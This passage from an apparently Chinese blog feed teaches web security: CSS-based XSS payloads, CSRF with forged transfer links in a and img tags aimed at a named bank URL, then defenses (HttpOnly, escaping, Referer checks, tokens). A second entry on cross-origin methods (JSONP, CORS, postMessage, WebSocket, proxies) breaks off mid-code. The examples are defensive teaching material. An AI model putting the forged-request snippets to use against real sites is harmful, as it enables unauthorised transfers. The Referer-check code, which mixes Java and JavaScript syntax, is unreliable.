id="CSS中"><a href="#CSS中" class="headerlink" title="CSS中"></a>CSS中</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">body &#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;</span><br><span class="line">body &#123;background-image:expression(alert(/xss/));&#125;</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="HttpOnly-防止劫取-Cookie"><a href="#HttpOnly-防止劫取-Cookie" class="headerlink" title="HttpOnly 防止劫取 Cookie"></a>HttpOnly 防止劫取 Cookie</h4><p>在网站的Cookie加上HttpOnly属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly</span><br></pre></td></tr></table></figure></p><p>这样浏览器就禁止JavaScript的读取了。</p><h4 id="XSS-Filter输入过滤"><a href="#XSS-Filter输入过滤" class="headerlink" title="XSS Filter输入过滤"></a>XSS Filter输入过滤</h4><p>过滤用户输入的 检查用户输入的内容中是否有非法内容。如&lt;&gt;（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&amp;（&amp; 符号）、+（加号）等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const decodingMap = &#123;</span><br><span class="line">  &apos;&amp;lt;&apos;: &apos;&lt;&apos;,</span><br><span class="line">  &apos;&amp;gt;&apos;: &apos;&gt;&apos;,</span><br><span class="line">  &apos;&amp;quot;&apos;: &apos;&quot;&apos;,</span><br><span class="line">  &apos;&amp;amp;&apos;: &apos;&amp;&apos;,</span><br><span class="line">  &apos;</span><br><span class="line">  &apos;: &apos;\n&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以利用下面这些函数对出现xss漏洞的参数进行过滤</p><ul><li>htmlspecialchars() 函数,用于转义处理在页面上显示的文本。</li><li>htmlentities() 函数,用于转义处理在页面上显示的文本。</li><li>strip_tags() 函数,过滤掉输入、输出里面的恶意标签。</li><li>header() 函数,使用header(“Content-type:application/json”); 用于控制 json 数据的头部，不用于浏览。</li><li>urlencode() 函数,用于输出处理字符型参数带入页面链接中。</li><li>intval() 函数用于处理数值型参数输出页面中。</li><li>OWASP Esapi 的 encodeForCSS()、encodeForHTML()、encodeForJavaScript()</li></ul><h4 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h4><p>用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。</p><h2 id="CSRF（Cross-Site-Request-Forgery）"><a href="#CSRF（Cross-Site-Request-Forgery）" class="headerlink" title="CSRF（Cross Site Request Forgery）"></a>CSRF（Cross Site Request Forgery）</h2><h3 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h3><p>可缩写为CSRF或者XSRF，是一种劫持受信任用户向服务器发送非预期请求的攻击方式。通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。</p><h3 id="CSRF-特点"><a href="#CSRF-特点" class="headerlink" title="CSRF 特点"></a>CSRF 特点</h3><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><h3 id="常见场景-1"><a href="#常见场景-1" class="headerlink" title="常见场景"></a>常见场景</h3><h4 id="在a标签中"><a href="#在a标签中" class="headerlink" title="在a标签中"></a>在a标签中</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;www.icbc.com.cn/transfer?toBankId=黑客的账户&amp;money=金额&quot;&gt;</span><br></pre></td></tr></table></figure><p>这得先知道icbc.com.cn的转账操作的url和参数名称。<br>如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。</p><h4 id="在img标签中"><a href="#在img标签中" class="headerlink" title="在img标签中"></a>在img标签中</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&amp;money=金额&quot;&gt;</span><br></pre></td></tr></table></figure><p>只要用户打开了这个页面，不点击任何东西，就会发生转账操作。</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p>验证码被认为是对抗 CSRF 攻击最简洁而有效的防御方法。CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击<br>但验证码并不是万能的，因为出于用户考虑，不能给网站所有的操作都加上验证码。因此，验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。</p><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的”源”。<br>比如某银行的转账是通过用户访问<a href="http://www.xxx.com/transfer.do页面完成的，用户必须先登录www.xxx.com，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是提交按钮所在页面的URL（本例为www.xxx" target="_blank" rel="noopener">http://www.xxx.com/transfer.do页面完成的，用户必须先登录www.xxx.com，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是提交按钮所在页面的URL（本例为www.xxx</a>. com/transfer.do）。如果攻击者要对银行网站实施CSRF攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的Referer的值是其他网站的地址，而不是银行转账页面的地址。<br>因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 www.xx.om 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String referer = request.getHeader(&quot;Referer&quot;);</span><br><span class="line">if (referer !== &apos;http://www.c.com:8002/&apos;) &#123;</span><br><span class="line">    res.write(&apos;csrf 攻击&apos;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="添加-token-验证"><a href="#添加-token-验证" class="headerlink" title="添加 token 验证"></a>添加 token 验证</h4><p>用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。<br>页面提交的请求携带这个Token，服务器验证Token是否正确。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域问题及其解决方式</title>
      <link href="/%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E5%8F%8A%E5%85%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F.html"/>
      <url>/%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E5%8F%8A%E5%85%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F.html</url>
      
        <content type="html"><![CDATA[<p>跨域可能是每个前端攻城狮在工作中不可避免会遇到的问题，在阅读了前辈们的解读后，本文将对跨域问题做一个总结。</p><a id="more"></a><h2 id="跨域的产生"><a href="#跨域的产生" class="headerlink" title="跨域的产生"></a>跨域的产生</h2><p>跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。而导致跨域问题的产生，来自于浏览器的<code>同源策略</code>。</p><blockquote><p>同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。</p></blockquote><p><img src="../assets/20191015/1.jpg" alt="Alt text"></p><p>同源策略限制内容有：</p><ul><li>Cookie、LocalStorage、IndexedDB 等存储性内容</li><li>DOM 节点</li><li>AJAX 请求发送后，结果被浏览器拦截了</li></ul><p>但是有三个标签是允许跨域加载资源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=XXX&gt;</span><br><span class="line">&lt;link href=XXX&gt;</span><br><span class="line">&lt;script src=XXX&gt;</span><br></pre></td></tr></table></figure></p><h2 id="常见跨域场景"><a href="#常见跨域场景" class="headerlink" title="常见跨域场景"></a>常见跨域场景</h2><p><img src="../assets/20191015/2.jpg" alt="Alt text"></p><p>注意点：</p><ul><li>如果是协议和端口造成的跨域问题“前台”是无能为力的。</li><li>在跨域问题上，仅仅是通过“URL的首部”来识别而不会根据域名对应的IP地址是否相同来判断。“URL的首部”可以理解为“协议, 域名和端口必须匹配”。</li><li>跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了。</li></ul><h2 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a>跨域解决方案</h2><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><h4 id="JSONP原理"><a href="#JSONP原理" class="headerlink" title="JSONP原理"></a>JSONP原理</h4><p>利用 <code>&lt;script&gt;</code> 标签没有跨域限制的漏洞，网页可以得到从其他来源动态产生的 JSON 数据。JSONP请求一定需要对方的服务器做支持才可以。</p><h4 id="JSONP优缺点"><a href="#JSONP优缺点" class="headerlink" title="JSONP优缺点"></a>JSONP优缺点</h4><p>JSONP优点是简单兼容性好，可用于解决主流浏览器的跨域数据访问的问题。缺点是仅支持get方法具有局限性,不安全可能会遭受XSS攻击。</p><h4 id="JSONP的实现流程"><a href="#JSONP的实现流程" class="headerlink" title="JSONP的实现流程"></a>JSONP的实现流程</h4><ul><li>声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。</li><li>创建一个 <code>&lt;script&gt;</code> 标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。</li><li>服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是show(‘我不爱你’)。</li><li>最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;JSONP 实例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;divCustomers&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function callbackFunction(result, methodName)</span><br><span class="line">&#123;</span><br><span class="line">    var html = &apos;&lt;ul&gt;&apos;;</span><br><span class="line">    for(var i = 0; i &lt; result.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        html += &apos;&lt;li&gt;&apos; + result[i] + &apos;&lt;/li&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    html += &apos;&lt;/ul&gt;&apos;;</span><br><span class="line">    document.getElementById(&apos;divCustomers&apos;).innerHTML = html;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-type: application/json&apos;);</span><br><span class="line">//获取回调函数名</span><br><span class="line">$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);</span><br><span class="line">//json数据</span><br><span class="line">$json_data = &apos;[&quot;customername1&quot;,&quot;customername2&quot;]&apos;;</span><br><span class="line">//输出jsonp格式的数据</span><br><span class="line">echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在开发中可能会遇到多个 JSONP 请求的回调函数名是相同的，这时候就需要自己封装一个 JSONP函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// index.html</span><br><span class="line">function jsonp(&#123; url, params, callback &#125;) &#123;</span><br><span class="line">  return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    let script = document.createElement(&apos;script&apos;)</span><br><span class="line">    //对重名回调函数做更新</span><br><span class="line">    window[callback] = function(data) &#123;</span><br><span class="line">      resolve(data)</span><br><span class="line">      document.body.removeChild(script)</span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123; ...params, callback &#125; // wd=b&amp;callback=show</span><br><span class="line">    let arrs = []</span><br><span class="line">    for (let key in params) &#123;</span><br><span class="line">      arrs.push(`$&#123;key&#125;=$&#123;params[key]&#125;`)</span><br><span class="line">    &#125;</span><br><span class="line">    script.src = `$&#123;url&#125;?$&#123;arrs.join(&apos;&amp;&apos;)&#125;`</span><br><span class="line">    document.body.appendChild(script)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">jsonp(&#123;</span><br><span class="line">  url: &apos;http://localhost:3000/say&apos;,</span><br><span class="line">  params: &#123; wd: &apos;Iloveyou&apos; &#125;,</span><br><span class="line">  callback: &apos;show&apos;</span><br><span class="line">&#125;).then(data =&gt; &#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="jQuery的JSONP形式"><a href="#jQuery的JSONP形式" class="headerlink" title="jQuery的JSONP形式"></a>jQuery的JSONP形式</h4><p>JSONP都是GET和异步请求的，不存在其他的请求方式和同步请求，且jQuery默认就会给JSONP的请求清除缓存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">  url:&quot;http://crossdomain.com/jsonServerResponse&quot;,</span><br><span class="line">  dataType:&quot;jsonp&quot;,</span><br><span class="line">  type:&quot;get&quot;,//可以省略</span><br><span class="line">  jsonpCallback:&quot;show&quot;,//-&gt;自定义传递给服务器的函数名，而不是使用jQuery自动生成的，可省略</span><br><span class="line">  jsonp:&quot;callback&quot;,//-&gt;把传递函数名的那个形参callback，可省略</span><br><span class="line">  success:function (data)&#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS 需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现。<br>浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。<br>服务端设置 Access-Control-Allow-Origin 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。<br>虽然设置 CORS 和前端没什么关系，但是通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为简单请求和复杂请求。</p><h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p>只要同时满足以下两大条件，就属于简单请求</p><ul><li><p>使用下列方法之一：</p><blockquote><p>GET<br>HEAD<br>POST</p></blockquote></li><li><p>Content-Type 的值仅限于下列三者之一：</p><blockquote><p>text/plain<br>multipart/form-data<br>application/x-www-form-urlencoded</p></blockquote></li></ul><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure></p><ul><li>如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。</li><li>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><ul><li>Access-Control-Allow-Origin：它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</li><li>Access-Control-Allow-Credentials：它的值是一个布尔值，表示是否允许发送Cookie，默认值为false。</li><li>Access-Control-Expose-Headers：想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。</li></ul><h4 id="复杂请求"><a href="#复杂请求" class="headerlink" title="复杂请求"></a>复杂请求</h4><p>不符合以上条件的请求就肯定是复杂请求了。 复杂请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,该请求是 option 方法的，通过该请求来知道服务端是否允许跨域请求。<br>下面是这个”预检”请求的HTTP头信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure></p><ul><li>Access-Control-Request-Method：用来列出浏览器的CORS请求会用到哪些HTTP方法。</li><li>Access-Control-Request-Headers：指定浏览器CORS请求会额外发送的头信息字段。</li></ul><p>服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line">Server: Apache/2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=2, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure></p><ul><li>Access-Control-Allow-Methods：它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。</li><li>Access-Control-Allow-Headers：是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</li><li>Access-Control-Allow-Credentials：该字段与简单请求时的含义相同。</li><li>Access-Control-Max-Age：该字段可选，用来指定本次预检请求的有效期，单位为秒。</li></ul><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。</p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>postMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：</p><ul><li>页面和其打开的新窗口的数据传递</li><li>多窗口之间消息传递</li><li>页面与嵌套的iframe消息传递</li><li>上面三个场景的跨域数据传递</li></ul><p>postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line">  &lt;iframe src=&quot;http://localhost:4000/b.html&quot; frameborder=&quot;0&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;&lt;/iframe&gt; //等它加载完触发一个事件</span><br><span class="line">  //内嵌在http://localhost:3000/a.html</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function load() &#123;</span><br><span class="line">        let frame = document.getElementById(&apos;frame&apos;)</span><br><span class="line">        frame.contentWindow.postMessage(&apos;我爱你&apos;, &apos;http://localhost:4000&apos;) //发送数据</span><br><span class="line">        window.onmessage = function(e) &#123; //接受返回数据</span><br><span class="line">          console.log(e.data) //我不爱你</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// b.html</span><br><span class="line">  window.onmessage = function(e) &#123;</span><br><span class="line">    console.log(e.data) //我爱你</span><br><span class="line">    e.source.postMessage(&apos;我不爱你&apos;, e.origin)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><h3 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h3><p>Websocket是HTML5的一个持久化的协议，它实现了浏览器与服务器的全双工通信，同时也是跨域的一种解决方案。WebSocket 在建立连接时需要借助 HTTP 协议，连接建立好了之后 client 与 server 之间的双向通信就与 HTTP 无关了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// socket.html</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let socket = new WebSocket(&apos;ws://localhost:3000&apos;);</span><br><span class="line">    socket.onopen = function () &#123;</span><br><span class="line">      socket.send(&apos;我爱你&apos;);//向服务器发送数据</span><br><span class="line">    &#125;</span><br><span class="line">    socket.onmessage = function (e) &#123;</span><br><span class="line">      console.log(e.data);//接收服务器返回的数据</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// server.js</span><br><span class="line">let express = require(&apos;express&apos;);</span><br><span class="line">let app = express();</span><br><span class="line">let WebSocket = require(&apos;ws&apos;);//记得安装ws</span><br><span class="line">let wss = new WebSocket.Server(&#123;port:3000&#125;);</span><br><span class="line">wss.on(&apos;connection&apos;,function(ws) &#123;</span><br><span class="line">  ws.on(&apos;message&apos;, function (data) &#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">    ws.send(&apos;我不爱你&apos;)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="Node中间件代理-两次跨域"><a href="#Node中间件代理-两次跨域" class="headerlink" title="Node中间件代理(两次跨域)"></a>Node中间件代理(两次跨域)</h3><p>实现原理：同源策略是浏览器需要遵循的标准，而如果是服务器向服务器请求就无需遵循同源策略。 代理服务器，需要做以下几个步骤：</p><ul><li>接受客户端请求 。</li><li>将请求转发给服务器。</li><li>拿到服务器响应数据。</li><li>将响应转发给客户端。</li></ul><p><img src="../assets/20191015/3.jpg" alt="Alt text"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// index.html(http://127.0.0.1:5500)</span><br><span class="line"> &lt;script 